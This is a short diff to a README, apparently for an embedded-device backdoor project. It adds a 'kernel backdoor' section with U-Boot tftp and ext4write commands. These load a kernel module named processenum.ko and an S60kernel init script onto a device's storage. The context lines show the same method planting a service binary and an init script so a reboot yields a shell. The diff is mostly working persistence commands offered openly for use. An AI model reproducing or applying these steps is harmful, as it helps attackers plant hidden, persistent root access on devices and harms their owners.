@@ -15,3 +15,16 @@ ext4write mmc 0:1 0x63000000 /var/servicex 0x5f
 ext4write mmc 0:1 0x64000000 /etc/init.d/S50servicex 0x161
 ```
 now reboot the device, let it boot and upon success you should receive your shell.
+
+### FOR kernel backdoor:
+
+same steps as above in addition to the below changes:
+```
+tftp 0x63000000 processenum.ko
+tftp 0x65000000 S60kernel
+```
+
+```
+ext4write mmc 0:1 0x63000000 /var/processenum.ko 0x1e1b8
+ext4write mmc 0:1 0x65000000 /etc/init.d/S60kernel 0x172
+```
